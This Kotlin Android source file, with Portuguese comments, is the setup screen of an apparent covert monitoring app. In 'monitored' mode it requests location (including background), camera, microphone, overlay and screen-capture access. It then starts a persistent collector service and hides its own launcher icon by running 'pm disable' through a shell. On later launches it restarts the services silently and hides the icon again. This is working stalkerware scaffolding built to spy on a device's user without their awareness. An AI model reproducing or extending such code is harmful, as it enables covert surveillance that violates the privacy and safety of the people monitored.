// MainActivity.kt
package com.universidade.monitor

import android.Manifest
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.RadioButton
import android.widget.RadioGroup
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat

class MainActivity : AppCompatActivity() {

    companion object {
        private const val PERMISSION_REQUEST_CODE = 100
        private const val SCREEN_CAPTURE_REQUEST_CODE = 101
        private const val OVERLAY_PERMISSION_REQUEST = 102
    }

    private lateinit var rgMode: RadioGroup
    private lateinit var rbMonitor: RadioButton
    private lateinit var rbMonitored: RadioButton
    private lateinit var btnStart: Button
    private lateinit var btnHide: Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        rgMode = findViewById(R.id.rgMode)
        rbMonitor = findViewById(R.id.rbMonitor)
        rbMonitored = findViewById(R.id.rbMonitored)
        btnStart = findViewById(R.id.btnStart)
        btnHide = findViewById(R.id.btnHide)

        // Verifica se já está configurado
        val prefs = getSharedPreferences("monitor", MODE_PRIVATE)
        val configured = prefs.getBoolean("configured", false)
        
        if (configured) {
            val mode = prefs.getString("mode", "monitor")
            if (mode == "monitor") {
                startMonitorService()
            } else {
                startCollectorService()
            }
            hideIcon()
            finish()
            return
        }

        btnStart.setOnClickListener {
            val selectedId = rgMode.checkedRadioButtonId
            if (selectedId == -1) {
                Toast.makeText(this, "Selecione um modo", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            val mode = if (selectedId == R.id.rbMonitor) "monitor" else "monitored"

            // Salva configuração
            prefs.edit().apply {
                putString("mode", mode)
                putBoolean("configured", true)
                putString("client_id", Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID))
                apply()
            }

            // Solicita permissões
            requestPermissions(mode)
        }

        btnHide.setOnClickListener {
            hideIcon()
        }
    }

    private fun requestPermissions(mode: String) {
        val permissions = mutableListOf<String>()

        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION)
        permissions.add(Manifest.permission.CAMERA)
        permissions.add(Manifest.permission.RECORD_AUDIO)
        permissions.add(Manifest.permission.ACCESS_NETWORK_STATE)
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            permissions.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }

        // Permissão de sobreposição para Android 10+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                val intent = Intent(
                    Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                    android.net.Uri.parse("package:$packageName")
                )
                startActivityForResult(intent, OVERLAY_PERMISSION_REQUEST)
            }
        }

        ActivityCompat.requestPermissions(
            this,
            permissions.toTypedArray(),
            PERMISSION_REQUEST_CODE
        )
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            if (grantResults.isNotEmpty() && grantResults.all { it == PackageManager.PERMISSION_GRANTED }) {
                val prefs = getSharedPreferences("monitor", MODE_PRIVATE)
                val mode = prefs.getString("mode", "monitor") ?: "monitor"

                if (mode == "monitor") {
                    startMonitorService()
                } else {
                    requestScreenCapture()
                }
            } else {
                Toast.makeText(this, "Permissões necessárias!", Toast.LENGTH_LONG).show()
            }
        }
    }

    private fun requestScreenCapture() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            val projectionManager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            startActivityForResult(
                projectionManager.createScreenCaptureIntent(),
                SCREEN_CAPTURE_REQUEST_CODE
            )
        } else {
            startCollectorService()
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        
        when (requestCode) {
            SCREEN_CAPTURE_REQUEST_CODE -> {
                if (resultCode == RESULT_OK && data != null) {
                    val prefs = getSharedPreferences("monitor", MODE_PRIVATE)
                    prefs.edit().apply {
                        putInt("screen_capture_result", resultCode)
                        putString("screen_capture_data", data.toUri(0))
                        apply()
                    }
                    startCollectorService()
                } else {
                    Toast.makeText(this, "Captura de tela necessária!", Toast.LENGTH_LONG).show()
                }
            }
            OVERLAY_PERMISSION_REQUEST -> {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && Settings.canDrawOverlays(this)) {
                    // Permissão concedida
                }
            }
        }
    }

    private fun startMonitorService() {
        val intent = Intent(this, MonitorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        Toast.makeText(this, "Monitorador iniciado!", Toast.LENGTH_SHORT).show()
        finish()
    }

    private fun startCollectorService() {
        val intent = Intent(this, CollectorService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent)
        } else {
            startService(intent)
        }
        Toast.makeText(this, "Coletor iniciado!", Toast.LENGTH_SHORT).show()
        finish()
    }

    private fun hideIcon() {
        try {
            val process = Runtime.getRuntime().exec("pm disable $packageName")
            process.waitFor()
            Toast.makeText(this, "Ícone escondido!", Toast.LENGTH_SHORT).show()
        } catch (e: Exception) {
            Toast.makeText(this, "Root necessário para esconder ícone", Toast.LENGTH_LONG).show()
        }
    }
}